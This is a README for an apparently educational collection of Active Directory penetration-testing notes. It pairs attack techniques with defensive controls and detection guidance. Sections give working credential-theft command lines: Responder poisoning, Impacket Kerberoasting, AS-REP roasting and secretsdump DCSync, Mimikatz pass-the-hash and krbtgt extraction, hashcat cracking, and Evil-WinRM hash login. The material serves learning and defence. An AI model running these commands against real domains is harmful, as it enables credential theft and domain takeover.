# 🔐 Active Directory Attacks & Enumeration

![Status](https://img.shields.io/badge/status-active-brightgreen)
![Level](https://img.shields.io/badge/level-intermediate-blue)
![License](https://img.shields.io/badge/license-MIT-lightgrey)

A structured collection of **Active Directory (AD) security notes, enumeration techniques, authentication protocols, credential attacks, lateral movement techniques, Kerberos attacks, BloodHound analysis, and ACL/ACE abuse**.

This repository is designed as a practical cybersecurity reference for understanding how Active Directory environments are enumerated, analyzed, attacked, and defended during **authorized penetration tests, security labs, and defensive validation exercises**.

> ⚠️ **Authorization Notice** — the techniques and commands documented in this repository should only be used against systems you own or systems for which you have explicit authorization to test.

---

## 📖 Table of Contents

- [Topic Overview](#-topic-overview)
- [01. AD Fundamentals & Enumeration Methodology](#-01-ad-fundamentals--enumeration-methodology)
- [02. Kerberos](#-02-kerberos)
- [03. NTLM](#-03-ntlm)
- [04. SharpHound & BloodHound](#-04-sharphound--bloodhound)
- [05. PowerView](#-05-powerview)
- [06. Kerberoasting](#-06-kerberoasting)
- [07. AS-REP Roasting](#-07-as-rep-roasting)
- [08. Mimikatz](#-08-mimikatz)
- [09. Pass the Hash & Pass the Ticket](#-09-pass-the-hash--pass-the-ticket)
- [10. Golden Ticket & Silver Ticket](#️-10-golden-ticket--silver-ticket)
- [11. DCSync](#-11-dcsync)
- [12. Evil-WinRM](#️-12-evil-winrm)
- [13. BloodHound Queries](#-13-bloodhound-queries)
- [14. BloodHound Edges](#-14-bloodhound-edges)
- [15. ACL & ACE Abuse](#-15-acl--ace-abuse)
- [Complete AD Attack Chain](#-complete-ad-attack-chain)
- [Defensive Perspective](#️-defensive-perspective)
- [Tools Covered](#-tools-covered)
- [Recommended Learning Order](#-recommended-learning-order)
- [Key Concepts to Remember](#-key-concepts-to-remember)
- [Recommended Practice Environment](#-recommended-practice-environment)
- [Important Takeaways](#-important-takeaways)
- [Folder Structure](#-folder-structure)
- [Author](#-author)
- [License](#-license)
- [Disclaimer](#️-disclaimer)

---

## 📚 Topic Overview

This directory contains **15 Active Directory security guides**, progressing from AD fundamentals and enumeration into authentication attacks, credential abuse, lateral movement, and BloodHound-based privilege escalation analysis.

| # | Topic | Main Focus |
|---|---|---|
| 01 | **AD Fundamentals & Enumeration Methodology** | Active Directory fundamentals, protocols, reconnaissance, enumeration methodology |
| 02 | **Kerberos** | Kerberos authentication, TGT, TGS, KDC, SPNs, pre-authentication |
| 03 | **NTLM** | NTLM authentication, LLMNR/NBT-NS, Responder, Inveigh, relay |
| 04 | **SharpHound** | BloodHound data collection and attack-path discovery |
| 05 | **PowerView** | Manual Active Directory enumeration and ACL verification |
| 06 | **Kerberoasting** | SPN enumeration, TGS extraction, offline password attacks |
| 07 | **AS-REP Roasting** | Accounts without Kerberos pre-authentication |
| 08 | **Mimikatz** | Credential extraction, ticket manipulation, Pass-the-Hash, DCSync |
| 09 | **Pass the Hash & Pass the Ticket** | NTLM hash and Kerberos ticket reuse |
| 10 | **Golden Ticket & Silver Ticket** | Kerberos ticket forging |
| 11 | **DCSync** | Active Directory replication abuse and credential extraction |
| 12 | **Evil-WinRM** | WinRM-based remote PowerShell access |
| 13 | **BloodHound Queries** | High-value AD relationship and attack-path queries |
| 14 | **BloodHound Edges** | BloodHound relationship types and their security impact |
| 15 | **BloodHound ACL/ACE Abuses** | Permission abuse, privilege escalation, and ACL analysis |

---

## 🏢 01. AD Fundamentals & Enumeration Methodology

### Active Directory Fundamentals

Active Directory is Microsoft's directory service used to centrally manage **users, computers, groups, policies, and identity/access relationships** across Windows environments.

**Core components:**
- **Domain** — administrative boundary containing users, computers, groups, and other objects.
- **Domain Controller (DC)** — server hosting Active Directory and handling authentication and directory queries.
- **Forest** — collection of one or more domains connected through trust relationships.
- **Users** — identity objects used for authentication and authorization.
- **Groups** — collections of users/computers used to assign permissions.
- **Organizational Units (OUs)** — containers used to organize AD objects.
- **Group Policy Objects (GPOs)** — policies used to configure and manage domain systems.

**Important AD protocols**

| Protocol | Purpose |
|---|---|
| Kerberos | Primary authentication protocol |
| LDAP | Directory queries and object enumeration |
| DNS | Service and domain discovery |
| SMB/NetBIOS | File sharing and legacy name resolution |
| NTLM | Legacy challenge-response authentication |
| WinRM | Windows remote management |

Kerberos, LDAP, DNS, and SMB/NetBIOS are highlighted as key services to recognize when identifying an AD environment.

### AD Enumeration Methodology

The central methodology of this series:

```text
Passive Reconnaissance → Network Discovery → Identify AD Services →
Domain / User Enumeration → Computer Enumeration → Authentication Analysis →
Relationship / Permission Mapping → Identify Attack Paths →
Credential Access → Lateral Movement → Privilege Escalation → Domain-Level Impact
```

The recommended starting position is often an unauthenticated internal-network perspective, where the tester initially has network reachability but no domain credentials or shell.

**Passive enumeration** — listen before actively interacting with the environment.
```bash
sudo tcpdump -i <interface>
```
Passive traffic can reveal ARP activity, hostnames, mDNS traffic, and other Layer 2 information. Responder can also be used in passive **Analyze** mode to observe LLMNR, NBT-NS, and mDNS traffic without poisoning responses.

**Important enumeration targets:** domain name, Domain Controllers, users, groups, computers, DNS records, LDAP, SMB, Kerberos, SPNs, trust relationships, shares, local administrator relationships, active sessions, ACLs, GPOs.

**ATT&CK:** `T1087` — Account Discovery, `T1069` — Permission Groups Discovery, `T1482` — Domain Trust Discovery

---

## 🎫 02. Kerberos

Kerberos is Active Directory's primary authentication protocol. It involves three main parties: Client → KDC (Authentication Service + Ticket Granting Service) → Target Service. The KDC operates on Domain Controllers and contains the **Authentication Service (AS)**, which issues TGTs, and the **Ticket Granting Service (TGS)**, which issues service tickets.

**Authentication flow**
```text
AS-REQ → KDC validates pre-authentication → AS-REP → TGT →
TGS-REQ + SPN → TGS-REP → Service Ticket → AP-REQ → Target Service
```

The TGT is protected using the **KRBTGT account key**, while the service ticket is encrypted using key material derived from the target service account's password hash.

**Important concepts:** TGT, TGS, KDC, SPN, Kerberos pre-authentication, KRBTGT, service accounts, ticket cache, ticket lifetime, ticket forging.

```cmd
klist
```

**Important Kerberos events**

| Event ID | Meaning |
|---|---|
| 4768 | TGT requested |
| 4769 | Service ticket requested |
| 4770 | Service ticket renewed |
| 4771 | Kerberos pre-authentication failure |

Monitor these events, particularly unusual 4769 activity and 4771 patterns associated with username enumeration.

---

## 🔑 03. NTLM

NTLM is Microsoft's legacy challenge-response authentication protocol.

**Simplified flow:** Client → Access Request → Server Challenge → Client Response → Server/DC Validation → Authentication

NTLMv2 is stronger than NTLMv1 but remains relevant to credential capture, offline cracking, NTLM relay, and LLMNR/NBT-NS poisoning.

**LLMNR/NBT-NS attack chain**
```text
DNS Lookup Fails → LLMNR/NBT-NS Broadcast → Attacker Responds →
Victim Authenticates → NetNTLMv2 Captured → Offline Cracking OR Relay
```
Responder is used for Linux-based testing, while Inveigh provides comparable functionality from Windows. **ATT&CK:** `T1557.001` — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

**Responder**
```bash
responder -I <interface> -A          # passive
sudo responder -I <interface>        # authorized active lab testing
```

Captured NetNTLMv2 material can be attacked offline with Hashcat:
```bash
hashcat -m 5600 captured_hash.txt rockyou.txt
```
NetNTLMv2 should not be confused with an NT hash used directly for traditional Pass-the-Hash attacks.

**Defensive controls:** disable LLMNR/NBT-NS where possible, enforce SMB signing, reduce unnecessary NTLM usage, strengthen password policies, monitor abnormal name-resolution traffic, segment internal networks.

---

## 🐺 04. SharpHound & BloodHound

**SharpHound = Data Collection.** **BloodHound = Graph Analysis.** SharpHound collects relationship information and produces JSON data, while BloodHound imports that information and visualizes relationships and attack paths.

**Data SharpHound can collect:** users, groups, computers, group memberships, local administrator relationships, sessions, ACLs, trust relationships, domain relationships, GPO-related information.

**Collection sources**
```text
LDAP    → Users, Groups, Computers, OUs, GPOs, ACLs
SMB/RPC → Sessions, Local Groups, Logged-on Users
```

**Example collection**
```cmd
SharpHound.exe -c All --zipfilename loot.zip
```
The resulting ZIP contains JSON data that can be imported into BloodHound.

**Useful collection types**

| Collection | Purpose |
|---|---|
| Default | Broad standard collection |
| All | Comprehensive collection |
| Session | Active logon sessions |
| LoggedOn | Logged-on user information |
| ACL | ACL-focused collection |

**Common BloodHound goals:** shortest path to Domain Admins, Kerberoastable users, computers where the current user is local administrator, paths from owned principals, CanRDP/CanPSRemote/SQLAdmin relationships, DCSync-capable accounts, ACL-based privilege escalation.

BloodHound's primary value is chaining individually small relationships into multi-hop attack paths.

---

## 🧭 05. PowerView

PowerView is a PowerShell-based AD enumeration tool used for manual investigation and verification. It complements BloodHound:

```text
BloodHound → find potential relationship → PowerView → manually verify → confirmed finding
```

**Core enumeration**
```powershell
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainController
Get-DomainUser
Get-DomainComputer
Get-DomainGroup
Get-DomainGroupMember
Get-DomainOU
```

**ACL enumeration**
```powershell
Find-InterestingDomainAcl
Get-ObjectAcl "DC=domain,DC=local" -ResolveGUIDs
```
PowerView can independently verify ACL relationships discovered through BloodHound.

**Computer enumeration**
```powershell
Get-NetLocalGroup
Get-NetLocalGroupMember
Get-NetShare
Get-NetSession
Test-AdminAccess
```

**Lateral-movement discovery**
```powershell
Find-LocalAdminAccess
Find-DomainUserLocation
Find-DomainShare
Find-InterestingDomainShareFile
```

**Trust enumeration**
```powershell
Get-DomainTrust
Get-ForestTrust
Get-DomainForeignUser
Get-DomainForeignGroupMember
Get-DomainTrustMapping
```

---

## 🔥 06. Kerberoasting

Kerberoasting abuses normal Kerberos behavior involving **Service Principal Names (SPNs)**. Any authenticated domain user can request a service ticket for an SPN-registered account. The resulting ticket contains material encrypted using the service account's password-derived key, allowing offline password attacks.

**Attack flow**
```text
Authenticated Domain User → Enumerate SPNs → Identify Service Accounts →
Review Privilege → Request TGS → Save Ticket → Offline Password Attack →
Recovered Credential → Validate Access
```

**Linux (Impacket)**
```bash
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user> -request
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user> -request-user <target> -outputfile <target>_tgs
hashcat -m 13100 <target>_tgs rockyou.txt
```

**Windows (Rubeus)**
```powershell
Rubeus.exe kerberoast
Rubeus.exe kerberoast /user:<target>
```

**Defensive priorities:** long/random service-account passwords, prefer gMSAs, avoid unnecessary privileged service accounts, monitor Event ID 4769, audit SPN registrations, rotate service credentials regularly.

**ATT&CK:** `T1558.003` — Steal or Forge Kerberos Tickets: Kerberoasting

---

## 🔓 07. AS-REP Roasting

AS-REP Roasting targets accounts where **Kerberos pre-authentication is disabled**. The key difference from Kerberoasting is the authentication requirement:

| Attack | Authentication Required |
|---|---|
| Kerberoasting | Authenticated domain user |
| AS-REP Roasting | No valid domain credential required |

**Attack flow**
```text
Username Enumeration → Identify Pre-Auth Disabled Account → Request AS-REP →
Obtain Crackable Material → Offline Cracking → Recovered Credential
```

**PowerView**
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname, userprincipalname, useraccountcontrol | fl
```

**Rubeus**
```powershell
Rubeus.exe asreproast /user:<target> /format:hashcat /nowrap
```

**Impacket**
```bash
GetNPUsers.py <domain>/ -dc-ip <dc_ip> -no-pass -usersfile valid_ad_users
```

**Hashcat**
```bash
hashcat -m 18200 asrep_hash.txt rockyou.txt
```

**Defensive controls:** require Kerberos pre-authentication, audit accounts with pre-authentication disabled, use strong passwords, monitor Kerberos authentication events, review service-account configurations.

**ATT&CK:** `T1558.004` — Steal or Forge Kerberos Tickets: AS-REP Roasting

---

## 🧠 08. Mimikatz

Mimikatz is a post-exploitation credential-access and authentication-abuse toolkit. It interacts heavily with **LSASS**, which can contain NTLM hashes, Kerberos tickets, authentication material, and — in some configurations — plaintext credentials.

**Major capabilities:** credential extraction, Kerberos ticket extraction, Pass the Hash, Golden Ticket, Silver Ticket, DCSync.

```text
mimikatz # sekurlsa::tickets /export                                          # export cached tickets to .kirbi
mimikatz # sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe   # Pass the Hash
mimikatz # lsadump::dcsync /user:<domain>\<target_account>                    # DCSync
mimikatz # lsadump::dcsync /user:<domain>\krbtgt                              # KRBTGT extraction
```
This connects the DCSync → KRBTGT → Golden Ticket workflow directly.

**Defensive controls:** restrict local Administrator/SYSTEM access, deploy Credential Guard where appropriate, monitor suspicious LSASS access and directory replication activity, use EDR behavioral detection, audit privileged accounts.

*(Mimikatz is a multi-technique toolkit rather than a single ATT&CK sub-technique — MITRE tracks it as software `S0002`, mapping to multiple credential-access and defense-evasion techniques depending on the module used.)*

---

## 🥷 09. Pass the Hash & Pass the Ticket

These techniques reuse authentication material instead of requiring the original cleartext password.

**Pass the Hash** — uses an NTLM hash: `NTLM Hash → Pass the Hash → NTLM Authentication`. **ATT&CK:** `T1550.002`

**Pass the Ticket** — uses an existing Kerberos TGT or service ticket: `Kerberos Ticket → Pass the Ticket → Kerberos Authentication`. **ATT&CK:** `T1550.003`

**Overpass the Hash** — uses NTLM key material to obtain a legitimate Kerberos TGT: `NTLM Key Material → Overpass the Hash → Kerberos TGT → Kerberos Authentication`.

Pass-the-Hash changes the *authentication method* but **does not change what the account is authorized to access**.

---

## 🎟️ 10. Golden Ticket & Silver Ticket

Kerberos ticket-forging techniques.

**Golden Ticket:** `KRBTGT Key → Forge TGT → Golden Ticket → Broad Domain-Level Access`
**Silver Ticket:** `Service Account Key → Forge TGS → Silver Ticket → Specific Service`

| Characteristic | Golden Ticket | Silver Ticket |
|---|---|---|
| Forged Ticket | TGT | TGS |
| Key Material | KRBTGT | Service Account |
| Scope | Domain-wide | Specific service/host |
| ATT&CK | `T1558.001` | `T1558.002` |
| Potential Impact | Extremely broad | Service-specific |

A Golden Ticket can be used to obtain service tickets, whereas a Silver Ticket can be presented directly to the target service. Silver Tickets can therefore have reduced visibility from Domain Controller logs, since the normal KDC interaction may not occur.

**Defensive priorities:** protect the KRBTGT account, monitor Kerberos activity and ticket lifetimes/encryption types, monitor service-level authentication, protect service-account credentials, review trust relationships, follow proper KRBTGT recovery procedures after suspected domain compromise.

---

## 🩸 11. DCSync

DCSync abuses legitimate Active Directory replication functionality rather than exploiting a traditional software vulnerability. It uses the **MS-DRSR** replication mechanism used by Domain Controllers.

**Important replication permissions:** `DS-Replication-Get-Changes`, `DS-Replication-Get-Changes-All`

**Conceptual flow**
```text
AD ACL → Replication Rights → DCSync-Capable Account → MS-DRSR Request →
Domain Controller → Credential Material (NTLM Hashes, Kerberos Keys, KRBTGT Key)
```

**Detecting DCSync-capable accounts (PowerView)**
```powershell
Get-ObjectAcl "DC=domain,DC=local" -ResolveGUIDs
```
Filter for replication-related permissions.

**Impacket**
```bash
secretsdump.py -just-dc <domain>/<user>:<password>@<dc_ip>
secretsdump.py -just-dc-user <target_user> <domain>/<user>:<password>@<dc_ip>
```

DCSync can expose NTLM password hashes, Kerberos key material, and KRBTGT key material — compromised KRBTGT key material can subsequently enable Golden Ticket attacks.

**Defense:** minimize replication permissions, restrict replication rights to authorized principals, audit domain-object ACLs, monitor replication activity, investigate replication requests from unexpected systems, protect privileged accounts.

**ATT&CK:** `T1003.006` — OS Credential Dumping: DCSync

---

## 🖥️ 12. Evil-WinRM

Evil-WinRM is a cross-platform client for **Windows Remote Management (WinRM)**. It can provide an interactive PowerShell-style session when the supplied account is authorized for remote management.

**Common WinRM ports**

| Port | Protocol |
|---|---|
| 5985 | WinRM over HTTP |
| 5986 | WinRM over HTTPS |

**Authentication flow:** Enumeration → Credential Access → Password/NTLM Hash → Authentication → WinRM → Evil-WinRM → Interactive PowerShell

```bash
evil-winrm -i <target_ip> -u <username> -p '<password>'   # password auth
evil-winrm -i <target_ip> -u <username> -H <ntlm_hash>     # NTLM hash auth
```

**Important BloodHound edge:** `CanPSRemote` — identifies a relationship where a principal can remotely access a system through PowerShell Remoting/WinRM.

**Defense:** restrict WinRM access, use administrative jump hosts, apply network segmentation, enable PowerShell logging, monitor privileged WinRM authentication, reduce unnecessary NTLM usage, review `CanPSRemote` relationships.

**ATT&CK:** `T1021.006` — Remote Services: Windows Remote Management

---

## 🩸 13. BloodHound Queries

BloodHound queries help identify relationships and attack paths that may otherwise be difficult to discover manually.

**High-value query categories:**
- **DCSync Rights** — `User → GetChanges/GetChangesAll → Domain`; these permissions can create a DCSync path.
- **Foreign Domain Membership** — users in foreign-domain groups, or groups containing foreign-domain users; can create cross-domain attack paths.
- **Domain Trusts** — parent/child domains, one-way trusts, two-way trusts, cross-domain relationships.
- **Unconstrained Delegation** — paths to systems where Kerberos tickets may be exposed through unconstrained delegation.
- **Kerberoastable Users** — service accounts with SPNs, prioritized by privilege and password-management risk.
- **Owned Principals** — after obtaining an authorized foothold, identify reachable systems and privilege-escalation paths from the owned principal.

---

## 🔗 14. BloodHound Edges

In BloodHound, a **Node** = AD object, and an **Edge** = relationship between two objects.

```text
UserA --MemberOf--> Helpdesk
UserA --CanRDP--> ComputerB
UserA --ForceChangePassword--> UserB
```

Edges reveal potential privilege escalation, lateral movement, credential access, delegation, and domain compromise.

**Important edges**

| Edge | Meaning |
|---|---|
| `AdminTo` | Local administrator access |
| `MemberOf` | Group membership |
| `HasSession` | User session on computer |
| `ForceChangePassword` | Can reset target password |
| `AddMembers` | Can add members to group |
| `AddSelf` | Can add itself to group |
| `CanRDP` | RDP access |
| `CanPSRemote` | WinRM/PowerShell Remoting access |
| `ExecuteDCOM` | DCOM execution relationship |
| `SQLAdmin` | SQL administrative access |
| `AllowedToDelegate` | Delegation relationship |
| `DCSync` | Replication capability |
| `GetChanges` | Replication-related permission |
| `GetChangesAll` | Extended replication permission |
| `GenericAll` | Full control |
| `WriteDACL` | Modify object's ACL |
| `GenericWrite` | Modify selected properties |
| `WriteOwner` | Change object ownership |
| `WriteSPN` | Modify SPN |
| `Owns` | Object ownership |
| `ReadLAPSPassword` | Read LAPS password |

The source material provides examples and defensive guidance for each of these relationships.

---

## 🔐 15. ACL & ACE Abuse

Active Directory attacks do not always require exploiting a CVE — misconfigured permissions can provide direct privilege-escalation paths.

**ACL** — an **Access Control List** defines who can perform actions on an AD object.
**ACE** — an **Access Control Entry** is an individual permission contained inside an ACL (e.g. "User A can reset User B's password" is one ACE).

**High-impact permissions:**
- **GenericAll** — full control over an AD object: password modification, group membership modification, attribute modification, permission modification.
- **GenericWrite** — modification of selected attributes; can create paths involving SPNs or delegation.
- **WriteOwner** — ownership changes that can lead to additional permission control.
- **WriteDACL** — modification of an object's permissions.
- **ForceChangePassword** — password reset without knowing the existing password.
- **AddMember** — adding an account to a group.
- **ReadLAPSPassword** — can expose local administrator credentials managed through LAPS.
- **WriteSPN** — modification of SPNs; can create a Kerberoasting path.
- **AllExtendedRights** — a collection of sensitive extended permissions.

---

## 🔥 Complete AD Attack Chain

The individual topics in this repository are interconnected:

```text
                    ACTIVE DIRECTORY
                           │
                 Passive Enumeration
                           │
                  Network Discovery
                           │
              Domain / User Enumeration
                           │
             ┌─────────────┴─────────────┐
             ▼                           ▼
          Kerberos                     NTLM
             │                           │
       ┌─────┴─────┐               ┌─────┴─────┐
       ▼           ▼               ▼           ▼
 Kerberoasting AS-REP          LLMNR/NBT-NS   Relay
       │           │               │
       └─────┬─────┘               ▼
             ▼                Credential Access
      Credential Material
             │
       Mimikatz / Hashes / Tickets
             │
       ┌─────┴──────────────┐
       ▼                    ▼
 Pass the Hash        Pass the Ticket
       │                    │
       └─────────┬──────────┘
                 ▼
          Lateral Movement
                 │
       SharpHound / BloodHound
                 │
           Attack Paths
                 │
       ┌─────────┼─────────┐
       ▼         ▼         ▼
     ACL       DCSync   Delegation
     Abuse       │
       │      KRBTGT
       │         │
       │    Golden Ticket
       │         │
       └─────────┬─────────┘
                 ▼
          Privilege Escalation
                 │
           Domain Compromise
```

This relationship between techniques is a recurring theme throughout the material: BloodHound helps identify the path, PowerView helps verify relationships, DCSync can expose credential/key material, and Kerberos ticket techniques can turn that material into broader access.

---

## 🛡️ Defensive Perspective

The same techniques can be viewed from a Blue Team/SOC perspective.

**Identity Security** — enforce strong password policies, use gMSAs for service accounts, remove unnecessary privileged memberships, protect Domain Administrators, minimize NTLM usage, enforce Kerberos pre-authentication.

**Active Directory Permissions** — regularly audit `GenericAll`, `GenericWrite`, `WriteDACL`, `WriteOwner`, `WriteSPN`, `ForceChangePassword`, `AddMember`, `DCSync`, `GetChanges`, `GetChangesAll`, `ReadLAPSPassword`. ACL hygiene is particularly important because permission-based attack paths can survive password changes and may not resemble conventional software exploitation.

**Kerberos Monitoring** — watch Event IDs `4768`, `4769`, `4770`, `4771` for unusual TGT/TGS requests, large numbers of SPN requests, unusual ticket lifetimes, encryption types, and authentication sources.

**NTLM Monitoring** — LLMNR traffic, NBT-NS traffic, unexpected responders, NTLM authentication, SMB relay indicators, hosts generating abnormal broadcast responses.

**DCSync Monitoring** — replication permissions, directory replication requests, Event ID `4662`, unexpected systems requesting replication, changes to domain-object ACLs.

**WinRM Monitoring** — WinRM authentication, Event ID `4624` in appropriate context, PowerShell Script Block/Module Logging, PowerShell Transcription, EDR telemetry, `CanPSRemote` relationships.

---

## 🧰 Tools Covered

| Tool | Primary Purpose |
|---|---|
| `Nmap` | Network/service discovery |
| `tcpdump` | Passive network observation |
| `Kerbrute` | Kerberos username enumeration |
| `Responder` | LLMNR/NBT-NS and authentication capture |
| `Inveigh` | Windows-based poisoning/capture |
| `SharpHound` | BloodHound data collection |
| `BloodHound` | AD graph and attack-path analysis |
| `PowerView` | Manual AD enumeration |
| `GetUserSPNs.py` | Kerberoasting |
| `GetNPUsers.py` | AS-REP Roasting |
| `Rubeus` | Kerberos ticket operations |
| `Mimikatz` | Credential/ticket operations |
| `Hashcat` | Offline password/hash cracking |
| `Impacket` | Windows protocol and AD security tooling |
| `Evil-WinRM` | WinRM remote PowerShell access |

---

## 📖 Recommended Learning Order

```text
01. AD Fundamentals & Enumeration → 02. Kerberos → 03. NTLM →
04. SharpHound / BloodHound → 05. PowerView → 06. Kerberoasting →
07. AS-REP Roasting → 08. Mimikatz → 09. Pass the Hash / Pass the Ticket →
10. Golden Ticket / Silver Ticket → 11. DCSync → 12. Evil-WinRM →
13. BloodHound Queries → 14. BloodHound Edges → 15. ACL / ACE Abuse
```

This order follows the dependency structure of the material: understand AD and authentication first, then enumeration, followed by credential attacks, ticket manipulation, replication abuse, remote access, and finally relationship/permission analysis.

---

## 🎯 Key Concepts to Remember

- **Kerberos:** `TGT → TGS → Service`. The service ticket is encrypted using key material derived from the target service account's password hash — the foundation of Kerberoasting.
- **NTLM:** `Challenge → Response → Capture / Relay`. NetNTLMv2 material may be cracked offline or relayed when the required conditions exist.
- **BloodHound:** `Collect → Graph → Find Path`. SharpHound collects relationship data; BloodHound turns that data into visual attack paths.
- **PowerView:** `Query → Verify → Understand`. Provides manual AD enumeration and can verify relationships discovered through BloodHound.
- **DCSync:** `Replication Rights → Directory Data`. Abuses legitimate replication functionality and requires appropriate replication permissions.
- **ACL Abuse:** `Permissions → Relationships → Attack Paths`. BloodHound can expose dangerous permission relationships that may provide privilege escalation without exploiting a software vulnerability.

---

## 🧪 Recommended Practice Environment

- **HTB Academy — Active Directory Enumeration & Attacks**
- Authorized Active Directory labs
- Isolated Windows/AD test environments
- BloodHound sample datasets
- Controlled purple-team exercises

The Kerberos material specifically recommends building understanding from normal ticket behavior first — including `klist` and packet-flow observation — before moving into Kerberoasting and AS-REP Roasting.

---

## 📌 Important Takeaways

1. **Enumerate before attacking.**
2. Understand **AD fundamentals** before learning attack commands.
3. Understand **Kerberos mechanics** before studying ticket attacks.
4. NTLM remains important because legacy authentication creates useful attack opportunities.
5. **SharpHound collects; BloodHound analyzes.**
6. **PowerView verifies** relationships manually.
7. Kerberoasting depends on **SPNs and service-account password strength**.
8. AS-REP Roasting depends on **disabled Kerberos pre-authentication**.
9. Mimikatz is a broader credential and authentication-abuse toolkit rather than a single attack.
10. **Pass the Hash** uses NTLM material; **Pass the Ticket** uses Kerberos tickets.
11. **Golden Ticket = KRBTGT + forged TGT.**
12. **Silver Ticket = service account key + forged TGS.**
13. DCSync abuses **replication permissions**, not a conventional software vulnerability.
14. Evil-WinRM provides remote PowerShell access through WinRM when the account is authorized.
15. BloodHound **edges are relationships**, and dangerous relationships can create privilege-escalation paths.
16. ACL/ACE abuse can be just as important as traditional vulnerabilities.
17. Defensive AD security requires **least privilege, ACL auditing, strong service-account security, authentication monitoring, segmentation, and privileged-access controls**.

---

## 📁 Folder Structure

```text
10_Active_Directory
│
├── 01. Active Directory Attacks - AD Basics & Enumeration Methodology.pdf
├── 02. Active Directory Attacks - Kerberos.pdf
├── 03. Active Directory Attacks - NTLM.pdf
├── 04. Active Directory Attacks - SharpHound (BloodHound Data Collection).pdf
├── 05. Active Directory Attacks - PowerView.pdf
├── 06. Active Directory Attacks - Kerberoasting.pdf
├── 07. Active Directory Attacks - AS-REP Roasting.pdf
├── 08. Active Directory Attacks - Mimikatz.pdf
├── 09. Active Directory Attacks - Pass the Hash & Pass the Ticket.pdf
├── 10. Active Directory Attacks - Golden Ticket & Silver Ticket.pdf
├── 11. Active Directory Attacks - DCSync.pdf
├── 12. Active Directory Attacks - Evil-WinRM.pdf
├── 13. BloodHound Queries.pdf
├── 14. BloodHound Edges.pdf
├── 15. BloodHound ACL ACE Abuses in Active Directory.pdf
└── README.md
```

---

## ⭐ Repository Goal

The goal of this section is to build a strong **Active Directory penetration-testing and defense foundation** by understanding not only *which commands to run*, but **why each technique works, what relationship or trust assumption it abuses, how techniques connect together, and how defenders can detect and mitigate them**.

> **Learn the protocol → Enumerate the environment → Understand the relationship → Identify the attack path → Validate safely → Detect → Remediate.**

---

## 👤 Author

**Omkar Sawant**
Cybersecurity Enthusiast | Aspiring Penetration Tester

- GitHub: [@omkarsawant1337](https://github.com/omkarsawant1337)
- LinkedIn: [omkar-sawant-vapt](https://linkedin.com/in/omkar-sawant-vapt)

---

## 📄 License

This project is licensed under the [MIT License](LICENSE).

---

## ⚠️ Disclaimer

All information in this repository is intended for **educational purposes, authorized penetration testing, cybersecurity labs, and defensive security research**. Do not use these techniques against systems, accounts, networks, or organizations without explicit authorization.
